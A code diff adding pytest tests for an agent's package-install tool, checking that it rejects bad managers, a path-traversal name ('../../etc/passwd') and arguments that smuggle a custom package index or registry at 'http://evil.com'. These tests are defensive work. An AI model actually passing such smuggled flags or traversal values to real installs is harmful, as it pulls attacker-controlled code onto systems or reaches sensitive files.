@@ -576,6 +576,56 @@ def test_execution_cap_registers_task_tools():
         assert name in cap["dispatch"]
 
 
+# ── T3: install_pkg ──────────────────────────────────────────────────────────
+
+
+def test_install_pkg_empty():
+    r = nt._install_pkg("")
+    assert "error" in r
+
+
+def test_install_pkg_bad_manager():
+    r = nt._install_pkg("requests", manager="yarn")
+    assert "error" in r
+    assert "不支持" in r["error"]
+
+
+def test_install_pkg_bad_name():
+    r = nt._install_pkg("../../etc/passwd")
+    assert "error" in r
+
+
+def test_install_pkg_blocks_custom_index():
+    r = nt._install_pkg("requests --index-url http://evil.com/simple")
+    assert "error" in r
+    assert "自定义包源" in r["error"] or "禁止" in r["error"]
+
+
+def test_install_pkg_blocks_registry_flag():
+    r = nt._install_pkg("lodash --registry http://evil.com", manager="npm")
+    assert "error" in r
+
+
+def test_install_pkg_success_monkeypatch(monkeypatch):
+    """monkeypatch subprocess.run 避免真装包。"""
+    class _FakeResult:
+        returncode = 0
+        stdout = "Successfully installed test-pkg-1.0"
+        stderr = ""
+    monkeypatch.setattr(subprocess, "run", lambda *a, **kw: _FakeResult())
+    r = nt._install_pkg("test-pkg")
+    assert r["installed"] is True
+    assert r["package"] == "test-pkg"
+    assert r["manager"] == "pip"
+
+
+def test_execution_cap_registers_install_pkg():
+    cap = capabilities.build(["execution"], agent_id="xi")
+    names = {d["function"]["name"] for d in cap["tool_defs"]}
+    assert "install_pkg" in names
+    assert "install_pkg" in cap["dispatch"]
+
+
 def test_execution_cap_registers_git_tools():
     cap = capabilities.build(["execution"], agent_id="xi")
     names = {d["function"]["name"] for d in cap["tool_defs"]}
